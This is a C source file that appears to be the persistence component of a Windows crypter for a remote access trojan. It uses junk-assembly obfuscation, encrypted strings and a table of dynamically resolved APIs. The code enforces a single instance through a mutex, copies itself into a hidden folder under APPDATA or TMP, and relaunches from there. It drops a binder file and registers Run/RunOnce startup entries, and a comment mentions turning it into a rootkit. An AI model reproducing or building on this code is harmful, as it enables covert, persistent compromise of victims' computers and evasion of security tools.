#include "global_config.h"
#include "persistance.h"
#include "common_utils.h"
#include "tor_executor.h"
#include "persistance_registry.h"
#include "crypto.h"

#include "binder_executor.h"
#include "junk_asm.h"

#include "functions_table.h"

#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <windows.h>
#include <Wincrypt.h>


#pragma warning(disable:4996)

#define BUFSIZE 1024
#define MD5LEN  16

#include "debug.h"

/*
- return 0 if NOT exist
- otherwise existed.
*/
void check_has_run(char* mutex) {
    ASM_JUNK

        l_CreateMutexA(NULL, TRUE, mutex);
    //

    switch (l_GetLastError()) {
    case ERROR_SUCCESS:
        DBG_MSG("check_has_run() - NO instnace running, continue.\n");
        return;
    case ERROR_ALREADY_EXISTS:
        // Process is running already
        DBG_MSG("check_has_run() - An instance has already been running-1. Exit now.\n");
       l_ExitProcess(1);
    default:
        DBG_MSG("check_has_run() - An instance has already been running-2. Exit now.\n");
       l_ExitProcess(1);
    }



}


/*
- calculate md5 content of a file.
- this function is not used by now.
*/
/*
static char * cal_md5(char * filename)
{
    ASM_JUNK

    DWORD dwStatus = 0;
    BOOL bResult = FALSE;
    HCRYPTPROV hProv = 0;
    HCRYPTHASH hHash = 0;
    HANDLE hFile = NULL;
    BYTE rgbFile[BUFSIZE];
    DWORD cbRead = 0;
    BYTE rgbHash[MD5LEN];
    DWORD cbHash = 0;
    CHAR rgbDigits[] = "0123456789abcdef";

    //
    char * md5 = (char *)calloc(17, 1);
    //

    hFile = CreateFileA(filename,
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_FLAG_SEQUENTIAL_SCAN,
        NULL);

    if (INVALID_HANDLE_VALUE == hFile)
    {
        dwStatus = l_GetLastError();
        DBG_MSG("Error opening file %s\nError: %d\n", filename, dwStatus);

        return md5;
    }

    // Get handle to the crypto provider
    if (!CryptAcquireContext(&hProv,
        NULL,
        NULL,
        PROV_RSA_FULL,
        CRYPT_VERIFYCONTEXT))
    {
        dwStatus = l_GetLastError();
        DBG_MSG("CryptAcquireContext failed: %d\n", dwStatus);
        CloseHandle(hFile);
        return md5;
    }

    if (!CryptCreateHash(hProv, CALG_MD5, 0, 0, &hHash))
    {
        dwStatus = l_GetLastError();
        DBG_MSG("CryptAcquireContext failed: %d\n", dwStatus);
        CloseHandle(hFile);
        CryptReleaseContext(hProv, 0);
        return md5;
    }

    while (bResult = ReadFile(hFile, rgbFile, BUFSIZE,
        &cbRead, NULL))
    {
        if (0 == cbRead)
        {
            break;
        }

        if (!CryptHashData(hHash, rgbFile, cbRead, 0))
        {
            dwStatus = l_GetLastError();
            DBG_MSG("CryptHashData failed: %d\n", dwStatus);
            CryptReleaseContext(hProv, 0);
            CryptDestroyHash(hHash);
            CloseHandle(hFile);
            return md5;
        }
    }

    if (!bResult)
    {
        dwStatus = l_GetLastError();
        DBG_MSG("ReadFile failed: %d\n", dwStatus);
        CryptReleaseContext(hProv, 0);
        CryptDestroyHash(hHash);
        CloseHandle(hFile);
        return md5;
    }

    cbHash = MD5LEN;
    if (CryptGetHashParam(hHash, HP_HASHVAL, rgbHash, &cbHash, 0))
    {
        DBG_MSG("MD5 hash of file %s is: ", filename);

        for (DWORD i = 0; i < cbHash; i++)
        {
            DBG_MSG("%c%c", rgbDigits[rgbHash[i] >> 4], rgbDigits[rgbHash[i] & 0xf]);
        }
        DBG_MSG("\n");
    }
    else
    {
        dwStatus = l_GetLastError();
        DBG_MSG("CryptGetHashParam failed: %d\n", dwStatus);
    }

    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);
    CloseHandle(hFile);

    return md5;
}
*/

/*
// TODO: this function must be take care in the case we make this crypter a ROOTKIT
BOOL FileExists(LPCTSTR szPath)
{
    ASM_JUNK

    DWORD dwAttrib = GetFileAttributes(szPath);

    return (dwAttrib != INVALID_FILE_ATTRIBUTES &&
        !(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
}
*/

int persistance(char* prev_rat_drop_exe) {
    ASM_JUNK;

    DBG_MSG("persistance() - begin\n");
    char exe_install_path[300];
    char insall_folder[300];

    //
    char* rat_install_filename_decrypted = NULL;
    decrypt_to_string(&rat_install_filename_decrypted, RAT_INSTALL_FILENAME, RAT_INSTALL_FILENAME_ENCRYPTED_LEN);

    DBG_MSG("persistance() - rat_install_filename_decrypted: %s\n", rat_install_filename_decrypted);

    //
    char* rat_install_folder_decrypted = NULL;
    decrypt_to_string(&rat_install_folder_decrypted, RAT_INSTALL_FOLDER, RAT_INSTALL_FOLDER_ENCRYPTED_LEN);

    DBG_MSG("persistance() - rat_install_folder_decrypted: %s\n", rat_install_folder_decrypted);


    switch (RAT_INSTALL_LOCATION) {
    case 1:
    {
        char* appdata = NULL;
        decrypt_to_string(&appdata, APPDATA, APPDATA_LEN);

        DBG_MSG("persistance() - appdata decrypted: %s\n", appdata);

        char* appdata_path = getenv(appdata);

        DBG_MSG("persistance() - appdata: %s\n", appdata_path);
        //
        free(appdata);

        strcpy(exe_install_path, appdata_path);
        strcat(exe_install_path, "\\");
        strcat(exe_install_path, rat_install_folder_decrypted);

        strcpy(insall_folder, exe_install_path);

        strcat(exe_install_path, "\\");
        strcat(exe_install_path, rat_install_filename_decrypted);
    }

    break;
    case 2:
    {
        char* tmp = NULL;
        decrypt_to_string(&tmp, TMP, TMP_LEN);

        DBG_MSG("persistance() - tmp decrypted: %s\n", tmp);

        char* tmp_path = getenv(tmp);

        DBG_MSG("persistance() - tmp: %s\n", tmp_path);
        //
        free(tmp);

        
        strcpy(exe_install_path, tmp_path);
        strcat(exe_install_path, "\\");
        strcat(exe_install_path, rat_install_folder_decrypted);

        strcpy(insall_folder, exe_install_path);

        strcat(exe_install_path, "\\");
        strcat(exe_install_path, rat_install_filename_decrypted);
    }

    break;
    default:
        DBG_MSG("persistance() - No install location found for value: %d. Exit now.\n", RAT_INSTALL_LOCATION);

        free(rat_install_filename_decrypted);
        free(rat_install_folder_decrypted);

       l_ExitProcess(1);
    }

    //
    free(rat_install_filename_decrypted);
    free(rat_install_folder_decrypted);

    //
    DBG_MSG("persistance() - insall_folder: %s\n", insall_folder);
    DBG_MSG("persistance() - exe_install_path: %s\n", exe_install_path);

    //
    char current_module_filename[300];

    l_GetModuleFileNameA(NULL, current_module_filename, 300);

    DBG_MSG("persistance() - current_module_filename: %s\n", current_module_filename);

    if (strcmp(exe_install_path, current_module_filename)) {
        //
        wrapper_drop_and_open_binder_file();

        //
        DBG_MSG("persistance() - File NOT installed, going to copy.\n");


        l_CreateDirectoryA(insall_folder, FALSE);


        //
        if (!l_CopyFileA(current_module_filename, exe_install_path, false)) {
            DBG_MSG("persistance() - Could not copy file, exit now. code: %d\n", l_GetLastError());
           l_ExitProcess(1);
        }

        //
        DBG_MSG("persistance() - Setting the installed exe and folder to hidden mode.\n");


        //
        l_SetFileAttributesA(insall_folder, FILE_ATTRIBUTE_HIDDEN);
        l_SetFileAttributesA(exe_install_path, FILE_ATTRIBUTE_HIDDEN);

        // Now, transfer execution to installed executable & melt the current file. TODO: melt the old file.
        STARTUPINFOA si;
        PROCESS_INFORMATION pi;

        memset(&si, 0, sizeof(si));
        memset(&pi, 0, sizeof(pi));

        char cmd_line[300];

        strcpy(cmd_line, exe_install_path);
        strcat(cmd_line, " ");
        strcat(cmd_line, current_module_filename);

        //
        DBG_MSG("persistance() - CreateProcessA() with command: %s\n", cmd_line);

        //
        if (!l_CreateProcessA(NULL, cmd_line, NULL, NULL, FALSE, NULL, NULL, NULL, &si, &pi)) {
            DBG_MSG("persistance() - Error: Unable to run the target executable. CreateProcess failed with error %d\n", l_GetLastError());
            return 1;
        }


        DBG_MSG("persistance() - We're NOT the once running from installed location, so EXIT now.\n");
        l_ExitProcess(0);
    }

    //
    char* rat_startup_name_decrypted = NULL;
    decrypt_to_string(&rat_startup_name_decrypted, RAT_STARTUP_NAME, RAT_STARTUP_NAME_ENCRYPTED_LEN);

    DBG_MSG("persistance() - rat_startup_name_decrypted: %s\n", rat_startup_name_decrypted);

    //
    switch (RAT_STARTUP_METHOD) {
    case 1:
    case 2:
    case 3:
    case 4:
    {
        bool result = run_and_runonce(rat_startup_name_decrypted, exe_install_path, prev_rat_drop_exe, RAT_STARTUP_METHOD);

        if (result) {
            DBG_MSG("run_and_runonce() success!\n");
        }
        else {
            DBG_MSG("run_and_runonce() failed!\n");
        }

        break;
    }


    default:
        DBG_MSG("No startup method found for value: %d. Exitting now.\n", RAT_INSTALL_LOCATION);
       l_ExitProcess(1);
    }


    free(rat_startup_name_decrypted);

    return 0;
}
